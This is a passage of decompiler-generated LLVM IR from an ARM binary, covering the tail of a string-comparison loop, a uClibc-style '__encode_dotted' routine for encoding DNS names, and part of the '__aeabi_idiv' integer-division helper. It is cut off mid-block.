  %v0_1e428 = phi i32 [ %v1_1e428, %dec_label_pc_1e3d4._crit_edge ], [ %arg2, %entry ]
  %v0_1e42c = phi i32 [ %v1_1e42c, %dec_label_pc_1e3d4._crit_edge ], [ %tmp, %entry ]
  %v9_1e3d4 = icmp eq i32 %v0_1e42c, %v0_1e428
  %.pre = inttoptr i32 %v0_1e42c to i8*
  br i1 %v9_1e3d4, label %dec_label_pc_1e3d4._crit_edge, label %dec_label_pc_1e3dc

dec_label_pc_1e3dc:                               ; preds = %dec_label_pc_1e3d4
  %v2_1e3dc = load i8, i8* %.pre, align 1
  %v3_1e3dc = zext i8 %v2_1e3dc to i32
  %v1_1e3e0 = inttoptr i32 %v0_1e428 to i8*
  %v2_1e3e0 = load i8, i8* %v1_1e3e0, align 1
  %v3_1e3e0 = zext i8 %v2_1e3e0 to i32
  %v2_1e3e4 = load i32, i32* @global_var_2e434, align 4
  %v2_1e3e8 = mul nuw nsw i32 %v3_1e3dc, 2
  %v2_1e3ec = mul nuw nsw i32 %v3_1e3e0, 2
  %v2_1e3f0 = add i32 %v2_1e3ec, %v2_1e3e4
  %v3_1e3f0 = inttoptr i32 %v2_1e3f0 to i8*
  %v4_1e3f0 = load i8, i8* %v3_1e3f0, align 1
  %v6_1e3f0 = zext i8 %v4_1e3f0 to i32
  %v2_1e3f4 = add i32 %v2_1e3e4, %v2_1e3e8
  %v3_1e3f4 = inttoptr i32 %v2_1e3f4 to i8*
  %v4_1e3f4 = load i8, i8* %v3_1e3f4, align 1
  %v6_1e3f4 = zext i8 %v4_1e3f4 to i32
  %v1_1e400 = add i32 %v2_1e3f4, 1
  %v2_1e400 = inttoptr i32 %v1_1e400 to i8*
  %v3_1e400 = load i8, i8* %v2_1e400, align 1
  %v4_1e400 = zext i8 %v3_1e400 to i32
  %v1_1e404 = add i32 %v2_1e3f0, 1
  %v2_1e404 = inttoptr i32 %v1_1e404 to i8*
  %v3_1e404 = load i8, i8* %v2_1e404, align 1
  %v4_1e404 = zext i8 %v3_1e404 to i32
  %v3_1e408 = mul nuw i32 %v6_1e3f4, 16777216
  %v3_1e40c = mul nuw i32 %v6_1e3f0, 16777216
  store i32 %v3_1e40c, i32* @ip, align 4
  %v4_1e410 = sdiv i32 %v3_1e408, 65536
  %v5_1e410 = or i32 %v4_1e400, %v4_1e410
  %v4_1e414 = sdiv i32 %v3_1e40c, 65536
  %v5_1e414 = or i32 %v4_1e404, %v4_1e414
  %v2_1e418 = sub nsw i32 %v5_1e410, %v5_1e414
  %v9_1e418 = icmp eq i32 %v5_1e410, %v5_1e414
  br i1 %v9_1e418, label %dec_label_pc_1e3d4._crit_edge, label %bb

bb:                                               ; preds = %dec_label_pc_1e3dc
  ret i32 %v2_1e418

dec_label_pc_1e3d4._crit_edge:                    ; preds = %dec_label_pc_1e3d4, %dec_label_pc_1e3dc
  %v11_1e434 = phi i32 [ %v2_1e418, %dec_label_pc_1e3dc ], [ %v11_1e4343, %dec_label_pc_1e3d4 ]
  %v2_1e420 = load i8, i8* %.pre, align 1
  %v2_1e424 = icmp eq i8 %v2_1e420, 0
  %v1_1e428 = add i32 %v0_1e428, 1
  %v1_1e42c = add i32 %v0_1e42c, 1
  store i32 %v1_1e42c, i32* @lr, align 4
  br i1 %v2_1e424, label %dec_label_pc_1e434, label %dec_label_pc_1e3d4

dec_label_pc_1e434:                               ; preds = %dec_label_pc_1e3d4._crit_edge
  ret i32 %v11_1e434

; uselistorder directives
  uselistorder i32 %v1_1e42c, { 1, 0 }
  uselistorder i32 %v2_1e418, { 1, 0 }
  uselistorder i32 %v5_1e414, { 1, 0 }
  uselistorder i32 %v5_1e410, { 1, 0 }
  uselistorder i32 %v3_1e40c, { 1, 0 }
  uselistorder i32 %v0_1e42c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1e3d4._crit_edge, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1e43c = load i32, i32* @r4, align 4
  store i32 %v3_1e43c, i32* %stack_var_-32, align 4
  %v6_1e43c = load i32, i32* @r5, align 4
  %v9_1e43c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1e444 = load i32, i32* @r1, align 4
  store i32 %v0_1e444, i32* %r8.global-to-local, align 4
  %v0_1e448 = load i32, i32* @r2, align 4
  store i32 %v0_1e448, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1e4b023 = icmp slt i8* %arg1, null
  store i1 %v1_1e4b023, i1* %cpsr_n.global-to-local, align 1
  %v2_1e4b024 = icmp eq i8* %arg1, null
  store i1 %v2_1e4b024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e4b024, label %dec_label_pc_1e4c8, label %dec_label_pc_1e4bc

dec_label_pc_1e454:                               ; preds = %dec_label_pc_1e4bc
  %v2_1e454 = call i32 @__GI_strchr(i32 %v0_1e45426, i32 46)
  store i32 %v2_1e454, i32* %r0.global-to-local, align 4
  store i32 %v2_1e454, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1e458 = icmp slt i32 %v2_1e454, 0
  store i1 %v1_1e458, i1* %cpsr_n.global-to-local, align 1
  %v2_1e458 = icmp eq i32 %v2_1e454, 0
  store i1 %v2_1e458, i1* %cpsr_z.global-to-local, align 1
  %v0_1e45c = load i32, i32* @r4, align 4
  %v2_1e45c = sub i32 %v2_1e454, %v0_1e45c
  store i32 %v2_1e45c, i32* @r5, align 4
  br i1 %v2_1e458, label %dec_label_pc_1e464, label %dec_label_pc_1e470

dec_label_pc_1e464:                               ; preds = %dec_label_pc_1e454
  %v1_1e464 = inttoptr i32 %v0_1e45c to i8*
  store i32 %v0_1e45c, i32* %r0.global-to-local, align 4
  %v3_1e468 = call i32 @strlen(i8* %v1_1e464)
  store i32 %v3_1e468, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1e468, 16777216
  %v1_1e46c = sdiv i32 %sext, 16777216
  store i32 %v1_1e46c, i32* @r5, align 4
  %v0_1e47c.pre = load i32, i32* @r4, align 4
  %v0_1e48c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1e470

dec_label_pc_1e470:                               ; preds = %dec_label_pc_1e454, %dec_label_pc_1e464
  %v0_1e48c = phi i32 [ %v2_1e454, %dec_label_pc_1e454 ], [ %v0_1e48c.pre, %dec_label_pc_1e464 ]
  %v0_1e47c = phi i32 [ %v0_1e45c, %dec_label_pc_1e454 ], [ %v0_1e47c.pre, %dec_label_pc_1e464 ]
  %v0_1e49c = phi i32 [ %v2_1e45c, %dec_label_pc_1e454 ], [ %v1_1e46c, %dec_label_pc_1e464 ]
  %v0_1e470 = load i32, i32* %sl.global-to-local, align 4
  %v1_1e470 = add i32 %v0_1e470, 1
  store i32 %v1_1e470, i32* %r7.global-to-local, align 4
  %v1_1e474 = load i32, i32* %sb.global-to-local, align 4
  %v2_1e474 = sub i32 %v1_1e474, %v0_1e470
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1e478 = icmp slt i32 %v0_1e49c, 0
  store i1 %v1_1e478, i1* %cpsr_n.global-to-local, align 1
  %v2_1e478 = icmp eq i32 %v0_1e49c, 0
  store i1 %v2_1e478, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1e47c, i32* @r1, align 4
  %v0_1e480 = load i32, i32* %r8.global-to-local, align 4
  %v2_1e480 = add i32 %v0_1e480, %v1_1e470
  store i32 %v2_1e480, i32* @r0, align 4
  store i32 %v0_1e49c, i32* @r2, align 4
  %v1_1e488 = add i32 %v2_1e474, -1
  %v1_1e48c = add i32 %v0_1e48c, 1
  store i32 %v1_1e48c, i32* @r4, align 4
  br i1 %v2_1e478, label %.loopexit, label %dec_label_pc_1e494

dec_label_pc_1e494:                               ; preds = %dec_label_pc_1e470
  %v2_1e494 = sub i32 %v0_1e49c, %v1_1e488
  %v3_1e494 = icmp ult i32 %v0_1e49c, %v1_1e488
  %v4_1e494 = xor i32 %v1_1e488, %v0_1e49c
  %v5_1e494 = xor i32 %v2_1e494, %v0_1e49c
  %v6_1e494 = and i32 %v5_1e494, %v4_1e494
  %v7_1e494 = icmp slt i32 %v6_1e494, 0
  store i1 %v7_1e494, i1* %cpsr_v.global-to-local, align 1
  %v8_1e494 = icmp slt i32 %v2_1e494, 0
  store i1 %v8_1e494, i1* %cpsr_n.global-to-local, align 1
  %v9_1e494 = icmp eq i32 %v0_1e49c, %v1_1e488
  store i1 %v9_1e494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1e494, label %dec_label_pc_1e49c, label %.loopexit

dec_label_pc_1e49c:                               ; preds = %dec_label_pc_1e494
  %v1_1e49c = trunc i32 %v0_1e49c to i8
  %v4_1e49c = add i32 %v0_1e480, %v0_1e470
  %v5_1e49c = inttoptr i32 %v4_1e49c to i8*
  store i8 %v1_1e49c, i8* %v5_1e49c, align 1
  %v0_1e4a0 = call i32 @memcpy()
  store i32 %v0_1e4a0, i32* %r0.global-to-local, align 4
  %v0_1e4a4 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1e4a4 = icmp slt i32 %v0_1e4a4, 0
  store i1 %v1_1e4a4, i1* %cpsr_n.global-to-local, align 1
  %v2_1e4a4 = icmp eq i32 %v0_1e4a4, 0
  store i1 %v2_1e4a4, i1* %cpsr_z.global-to-local, align 1
  %v0_1e4a8 = load i32, i32* @r5, align 4
  %v1_1e4a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_1e4a8 = add i32 %v1_1e4a8, %v0_1e4a8
  store i32 %v2_1e4a8, i32* %sl.global-to-local, align 4
  br i1 %v2_1e4a4, label %dec_label_pc_1e4c8, label %dec_label_pc_1e49c.dec_label_pc_1e4b0_crit_edge

dec_label_pc_1e49c.dec_label_pc_1e4b0_crit_edge:  ; preds = %dec_label_pc_1e49c
  %v0_1e4b0.pre = load i32, i32* @r4, align 4
  store i32 %v0_1e4b0.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1e4b0 = icmp slt i32 %v0_1e4b0.pre, 0
  store i1 %v1_1e4b0, i1* %cpsr_n.global-to-local, align 1
  %v2_1e4b0 = icmp eq i32 %v0_1e4b0.pre, 0
  store i1 %v2_1e4b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e4b0, label %dec_label_pc_1e4c8, label %dec_label_pc_1e4bc

dec_label_pc_1e4bc:                               ; preds = %entry, %dec_label_pc_1e49c.dec_label_pc_1e4b0_crit_edge
  %v0_1e45426 = phi i32 [ %v0_1e4b0.pre, %dec_label_pc_1e49c.dec_label_pc_1e4b0_crit_edge ], [ %tmp, %entry ]
  %v5_1e4d0525 = phi i32 [ %v2_1e4a8, %dec_label_pc_1e49c.dec_label_pc_1e4b0_crit_edge ], [ 0, %entry ]
  %v1_1e4bc = inttoptr i32 %v0_1e45426 to i8*
  %v2_1e4bc = load i8, i8* %v1_1e4bc, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1e4c0 = icmp eq i8 %v2_1e4bc, 0
  store i1 %v2_1e4c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e4c0, label %dec_label_pc_1e4c8, label %dec_label_pc_1e454

dec_label_pc_1e4c8:                               ; preds = %dec_label_pc_1e49c.dec_label_pc_1e4b0_crit_edge, %dec_label_pc_1e49c, %dec_label_pc_1e4bc, %entry
  %v8_1e4d4 = phi i32 [ 0, %entry ], [ %v5_1e4d0525, %dec_label_pc_1e4bc ], [ %v2_1e4a8, %dec_label_pc_1e49c ], [ %v2_1e4a8, %dec_label_pc_1e49c.dec_label_pc_1e4b0_crit_edge ]
  %v0_1e4c8 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1e4c8 = icmp slt i32 %v0_1e4c8, 0
  store i1 %v1_1e4c8, i1* %cpsr_n.global-to-local, align 1
  %v2_1e4c8 = icmp eq i32 %v0_1e4c8, 0
  store i1 %v2_1e4c8, i1* %cpsr_z.global-to-local, align 1
  %tmp20 = icmp slt i32 %v0_1e4c8, 1
  br i1 %tmp20, label %bb21, label %bb

bb:                                               ; preds = %dec_label_pc_1e4c8
  %v6_1e4d0 = add i32 %v8_1e4d4, 1
  store i32 %v6_1e4d0, i32* %r0.global-to-local, align 4
  %v7_1e4d4 = load i32, i32* %r8.global-to-local, align 4
  %v9_1e4d4 = add i32 %v7_1e4d4, %v8_1e4d4
  %v10_1e4d4 = inttoptr i32 %v9_1e4d4 to i8*
  store i8 0, i8* %v10_1e4d4, align 1
  %v0_1e4d8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1e4d8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1e4d8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1e4c8, %bb
  %v2_1e4d8 = phi i1 [ %v2_1e4d8.pre, %bb ], [ false, %dec_label_pc_1e4c8 ]
  %v1_1e4d8 = phi i1 [ %v1_1e4d8.pre, %bb ], [ %v1_1e4c8, %dec_label_pc_1e4c8 ]
  %v0_1e4d8 = phi i1 [ %v0_1e4d8.pre, %bb ], [ %v2_1e4c8, %dec_label_pc_1e4c8 ]
  %v3_1e4d8 = xor i1 %v2_1e4d8, %v1_1e4d8
  %v4_1e4d8 = or i1 %v0_1e4d8, %v3_1e4d8
  br i1 %v4_1e4d8, label %.loopexit, label %bb22

bb22:                                             ; preds = %bb21
  %v7_1e4d8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v7_1e4d8, i32* @r4, align 4
  store i32 %v6_1e43c, i32* @r5, align 4
  store i32 %v9_1e43c, i32* @r6, align 4
  %v31_1e4d8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v31_1e4d8

.loopexit:                                        ; preds = %dec_label_pc_1e494, %dec_label_pc_1e470, %bb21
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1e4e0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1e4e0, i32* @r4, align 4
  store i32 %v6_1e43c, i32* @r5, align 4
  store i32 %v9_1e43c, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_1e4c8, { 0, 2, 1 }
  uselistorder i32 %v0_1e4b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1e4a4, { 1, 0 }
  uselistorder i32 %v2_1e494, { 1, 0 }
  uselistorder i32 %v1_1e488, { 2, 0, 3, 1 }
  uselistorder i32 %v0_1e49c, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1e46c, { 1, 0 }
  uselistorder i1 %v2_1e4b024, { 1, 0 }
  uselistorder i32 %v9_1e43c, { 1, 0 }
  uselistorder i32 %v6_1e43c, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 3, 8, 4, 6, 5, 9, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i8 0, { 15, 54, 55, 5, 6, 57, 56, 58, 36, 59, 17, 18, 60, 11, 61, 62, 64, 63, 39, 65, 40, 7, 19, 0, 67, 66, 41, 20, 21, 22, 23, 69, 68, 42, 70, 12, 71, 72, 16, 1, 73, 37, 38, 75, 76, 74, 8, 9, 77, 10, 79, 78, 43, 80, 2, 3, 24, 81, 82, 83, 25, 84, 13, 85, 52, 26, 27, 28, 29, 30, 86, 87, 88, 89, 90, 44, 92, 93, 94, 95, 91, 31, 32, 4, 96, 97, 98, 33, 100, 99, 34, 101, 102, 103, 45, 104, 105, 14, 107, 108, 46, 109, 110, 106, 111, 112, 113, 114, 116, 115, 117, 120, 118, 119, 121, 124, 122, 123, 125, 53, 126, 127, 128, 129, 146, 147, 143, 144, 145, 141, 142, 139, 140, 137, 138, 135, 136, 131, 132, 133, 134, 130, 148, 149, 150, 151, 152, 153, 154, 155, 157, 156, 159, 158, 160, 47, 162, 161, 35, 163, 48, 164, 166, 167, 165, 49, 168, 169, 51, 170, 50, 171, 172, 173, 174, 175, 176 }
  uselistorder i32 ()* @memcpy, { 18, 17, 16, 13, 12, 11, 10, 9, 8, 25, 15, 14, 7, 1, 6, 5, 0, 4, 3, 2, 26, 24, 23, 22, 21, 20, 19 }
  uselistorder i32 (i8*)* @strlen, { 15, 13, 12, 11, 10, 9, 28, 27, 14, 8, 7, 6, 29, 26, 25, 24, 22, 23, 21, 20, 19, 18, 32, 31, 30, 17, 16, 5, 3, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 9, 5, 4, 3, 0, 21, 8, 7, 6, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 2, 1 }
  uselistorder i32 46, { 1, 9, 2, 10, 11, 0, 6, 7, 12, 3, 8, 4, 5 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_1e4c8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1e4bc, { 1, 0 }
  uselistorder label %dec_label_pc_1e470, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1e4e4 = icmp slt i32 %arg2, 0
  %v2_1e4e4 = icmp eq i32 %arg2, 0
  %v0_1e4e8 = load i32, i32* @r0, align 4
  %v2_1e4e8 = xor i32 %v0_1e4e8, %arg2
  br i1 %v2_1e4e4, label %dec_label_pc_1e5fc, label %dec_label_pc_1e4f0

dec_label_pc_1e4f0:                               ; preds = %entry
  br i1 %v1_1e4e4, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1e4f0
  %v2_1e4f0 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1e4f0, %bb
  %v1_1e5bc = phi i32 [ %v2_1e4f0, %bb ], [ %arg2, %dec_label_pc_1e4f0 ]
  %v1_1e4f4 = add i32 %v1_1e5bc, -1
  %v7_1e4f4 = icmp eq i32 %v1_1e5bc, 1
  br i1 %v7_1e4f4, label %dec_label_pc_1e59c, label %dec_label_pc_1e4fc

dec_label_pc_1e4fc:                               ; preds = %thread-pre-split
  %v1_1e4fc = icmp slt i32 %v0_1e4e8, 0
  br i1 %v1_1e4fc, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1e4fc
  %v2_1e500 = sub i32 0, %v0_1e4e8
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1e4fc, %bb85
  %v0_1e5f0 = phi i32 [ %v0_1e4e8, %dec_label_pc_1e4fc ], [ %v2_1e500, %bb85 ]
  %v3_1e504 = icmp uge i32 %v0_1e5f0, %v1_1e5bc
  %v9_1e504 = icmp eq i32 %v0_1e5f0, %v1_1e5bc
  %v2_1e508 = xor i1 %v3_1e504, true
  %v3_1e508 = or i1 %v9_1e504, %v2_1e508
  br i1 %v3_1e508, label %dec_label_pc_1e5a8, label %dec_label_pc_1e50c

dec_label_pc_1e50c:                               ; preds = %bb86
  %v2_1e50c = and i32 %v1_1e4f4, %v1_1e5bc
  %v4_1e50c = icmp eq i32 %v2_1e50c, 0
  br i1 %v4_1e50c, label %dec_label_pc_1e5b8, label %dec_label_pc_1e514

dec_label_pc_1e514:                               ; preds = %dec_label_pc_1e50c
  %v3_1e514 = icmp ult i32 %v1_1e5bc, 536870912
  br i1 %v3_1e514, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1e514
  %v4_1e518 = mul i32 %v1_1e5bc, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1e514, %.thread
  %v0_1e538.pr40.ph = phi i32 [ %v4_1e518, %.thread ], [ %v1_1e5bc, %dec_label_pc_1e514 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1e514 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1e538.pr40 = phi i32 [ %v4_1e52c, %bb89 ], [ %v0_1e538.pr40.ph, %.preheader.preheader ]
  %v1_1e530 = phi i32 [ %v4_1e530, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1e524 = icmp ugt i32 %v0_1e538.pr40, 268435455
  br i1 %v2_1e524, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1e538thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1e528 = icmp ult i32 %v0_1e538.pr40, %v0_1e5f0
  br i1 %v4_1e528, label %bb88, label %dec_label_pc_1e538thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1e52c = and i32 %v0_1e538.pr40, 268435456
  %v3_1e52c = icmp eq i32 %v2_1e52c, 0
  %v4_1e52c = mul i32 %v0_1e538.pr40, 16
  br i1 %v3_1e52c, label %bb89, label %dec_label_pc_1e538.loopexit

bb89:                                             ; preds = %bb88
  %v2_1e530 = and i32 %v1_1e530, 268435456
  %v3_1e530 = icmp eq i32 %v2_1e530, 0
  %v4_1e530 = mul i32 %v1_1e530, 16
  br i1 %v3_1e530, label %.preheader, label %dec_label_pc_1e538thread-pre-split.loopexit.loopexit

dec_label_pc_1e538thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1e54452.ph = phi i32 [ %v1_1e530, %bb87 ], [ %v4_1e530, %bb89 ]
  %v0_1e538.pr42.ph = phi i32 [ %v0_1e538.pr40, %bb87 ], [ %v4_1e52c, %bb89 ]
  br label %dec_label_pc_1e538thread-pre-split.loopexit

dec_label_pc_1e538thread-pre-split.loopexit:      ; preds = %dec_label_pc_1e538thread-pre-split.loopexit.loopexit, %.thread3
  %v1_1e54452 = phi i32 [ %v1_1e530, %.thread3 ], [ %v1_1e54452.ph, %dec_label_pc_1e538thread-pre-split.loopexit.loopexit ]
  %v0_1e538.pr42 = phi i32 [ %v0_1e538.pr40, %.thread3 ], [ %v0_1e538.pr42.ph, %dec_label_pc_1e538thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1e538thread-pre-split

dec_label_pc_1e538thread-pre-split:               ; preds = %dec_label_pc_1e538thread-pre-split.loopexit, %bb91
  %v1_1e54450 = phi i32 [ %v1_1e54452, %dec_label_pc_1e538thread-pre-split.loopexit ], [ %v3_1e544, %bb91 ]
  %v2_1e53c48 = phi i32 [ %v0_1e5f0, %dec_label_pc_1e538thread-pre-split.loopexit ], [ %v2_1e53c, %bb91 ]
  %v0_1e538.pr = phi i32 [ %v0_1e538.pr42, %dec_label_pc_1e538thread-pre-split.loopexit ], [ %v3_1e540, %bb91 ]
  br label %dec_label_pc_1e538

dec_label_pc_1e538.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1e538

dec_label_pc_1e538:                               ; preds = %dec_label_pc_1e538.loopexit, %dec_label_pc_1e538thread-pre-split
  %v1_1e544 = phi i32 [ %v1_1e54450, %dec_label_pc_1e538thread-pre-split ], [ %v1_1e530, %dec_label_pc_1e538.loopexit ]
  %v2_1e53c = phi i32 [ %v2_1e53c48, %dec_label_pc_1e538thread-pre-split ], [ %v0_1e5f0, %dec_label_pc_1e538.loopexit ]
  %v1_1e540 = phi i32 [ %v0_1e538.pr, %dec_label_pc_1e538thread-pre-split ], [ %v4_1e52c, %dec_label_pc_1e538.loopexit ]
  %v2_1e538 = icmp slt i32 %v1_1e540, 0
  br i1 %v2_1e538, label %dec_label_pc_1e54c, label %bb90

bb90:                                             ; preds = %dec_label_pc_1e538
  %v4_1e53c = icmp ult i32 %v1_1e540, %v2_1e53c
  br i1 %v4_1e53c, label %bb91, label %dec_label_pc_1e54c

bb91:                                             ; preds = %bb90
  %v3_1e540 = mul i32 %v1_1e540, 2
  %v2_1e544 = icmp slt i32 %v1_1e544, 0
  %v3_1e544 = mul i32 %v1_1e544, 2
  br i1 %v2_1e544, label %dec_label_pc_1e54c, label %dec_label_pc_1e538thread-pre-split

dec_label_pc_1e54c:                               ; preds = %bb90, %dec_label_pc_1e538, %bb91
  %v2_1e55863 = phi i32 [ %v3_1e544, %bb91 ], [ %v1_1e544, %bb90 ], [ %v1_1e544, %dec_label_pc_1e538 ]
  %v1_1e55055 = phi i32 [ %v3_1e540, %bb91 ], [ %v1_1e540, %bb90 ], [ %v1_1e540, %dec_label_pc_1e538 ]
  br label %dec_label_pc_1e550

dec_label_pc_1e550:                               ; preds = %.thread13, %dec_label_pc_1e54c
  %v1_1e584 = phi i32 [ %v4_1e584, %.thread13 ], [ %v2_1e55863, %dec_label_pc_1e54c ]
  %v1_1e558 = phi i32 [ %v1_1e594, %.thread13 ], [ 0, %dec_label_pc_1e54c ]
  %v1_1e588 = phi i32 [ %v4_1e588, %.thread13 ], [ %v1_1e55055, %dec_label_pc_1e54c ]
  %v1_1e554 = phi i32 [ %v0_1e580, %.thread13 ], [ %v0_1e5f0, %dec_label_pc_1e54c ]
  %v3_1e550 = icmp ult i32 %v1_1e554, %v1_1e588
  br i1 %v3_1e550, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1e550
  %v3_1e554 = sub i32 %v1_1e554, %v1_1e588
  %v3_1e558 = or i32 %v1_1e558, %v1_1e584
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1e550, %bb92
  %v1_1e560 = phi i32 [ %v1_1e554, %dec_label_pc_1e550 ], [ %v3_1e554, %bb92 ]
  %v1_1e564 = phi i32 [ %v1_1e558, %dec_label_pc_1e550 ], [ %v3_1e558, %bb92 ]
  %v4_1e55c = udiv i32 %v1_1e588, 2
  %v6_1e55c = icmp ult i32 %v1_1e560, %v4_1e55c
  br i1 %v6_1e55c, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1e560 = urem i32 %v1_1e588, 2
  %v4_1e560 = icmp eq i32 %v3_1e560, 0
  %v6_1e560 = sub i32 %v1_1e560, %v4_1e55c
  br i1 %v4_1e560, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1e564 = udiv i32 %v1_1e584, 2
  %v6_1e564 = or i32 %v1_1e564, %v5_1e564
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1e56c = phi i32 [ %v6_1e560, %bb93 ], [ %v1_1e560, %.thread8 ], [ %v6_1e560, %bb94 ]
  %v1_1e570 = phi i32 [ %v1_1e564, %bb93 ], [ %v1_1e564, %.thread8 ], [ %v6_1e564, %bb94 ]
  %v4_1e568 = udiv i32 %v1_1e588, 4
  %v6_1e568 = icmp ult i32 %v1_1e56c, %v4_1e568
  br i1 %v6_1e568, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1e56c = and i32 %v1_1e588, 2
  %v4_1e56c = icmp eq i32 %v3_1e56c, 0
  %v6_1e56c = sub i32 %v1_1e56c, %v4_1e568
  br i1 %v4_1e56c, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1e570 = udiv i32 %v1_1e584, 4
  %v6_1e570 = or i32 %v1_1e570, %v5_1e570
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1e578 = phi i32 [ %v6_1e56c, %bb95 ], [ %v1_1e56c, %.thread9 ], [ %v6_1e56c, %bb96 ]
  %v1_1e57c = phi i32 [ %v1_1e570, %bb95 ], [ %v1_1e570, %.thread9 ], [ %v6_1e570, %bb96 ]
  %v4_1e574 = udiv i32 %v1_1e588, 8
  %v6_1e574 = icmp ult i32 %v1_1e578, %v4_1e574
  br i1 %v6_1e574, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1e578 = and i32 %v1_1e588, 4
  %v4_1e578 = icmp eq i32 %v3_1e578, 0
  %v6_1e578 = sub i32 %v1_1e578, %v4_1e574
  br i1 %v4_1e578, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1e57c = udiv i32 %v1_1e584, 8
  %v6_1e57c = or i32 %v1_1e57c, %v5_1e57c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1e594 = phi i32 [ %v1_1e57c, %bb97 ], [ %v1_1e57c, %.thread10 ], [ %v6_1e57c, %bb98 ]
  %v0_1e580 = phi i32 [ %v6_1e578, %bb97 ], [ %v1_1e578, %.thread10 ], [ %v6_1e578, %bb98 ]
  %v2_1e580 = icmp eq i32 %v0_1e580, 0
  br i1 %v2_1e580, label %dec_label_pc_1e590, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1e584, 16
  br i1 %tmp, label %dec_label_pc_1e590, label %.thread13

.thread13:                                        ; preds = %bb99
